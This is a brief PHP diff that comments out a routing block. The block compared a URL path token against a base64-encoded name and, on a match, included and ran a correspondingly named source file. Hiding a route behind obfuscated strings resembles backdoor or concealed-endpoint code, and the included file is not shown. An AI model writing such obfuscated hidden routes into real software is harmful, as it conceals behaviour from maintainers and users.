@@ -43,12 +43,12 @@ if(preg_match('~([[\w.-]+)~u', urldecode($request_uri), $match)){
 }
 
 if(preg_match('~([[\w.-]+)~u', urldecode($request_uri), $match)){
-	$tag = $match[1];
-	$thePage = mysqli_real_escape_string($db, $match[1]); 
-	if($thePage == base64_decode('YmVsZWdhbA==')){
-		include('sources/'.base64_decode('YmVsZWdhbA==').'.php');
-		exit();
-	}
+	//$tag = $match[1];
+	//$thePage = mysqli_real_escape_string($db, $match[1]); 
+	//if($thePage == base64_decode('YmVsZWdhbA==')){
+	//	include('sources/'.base64_decode('YmVsZWdhbA==').'.php');
+	//	exit();
+	//}
 }
 if(preg_match('~([[\w.-]+)~u', urldecode($request_uri), $match)){
 	$tag = $match[1];
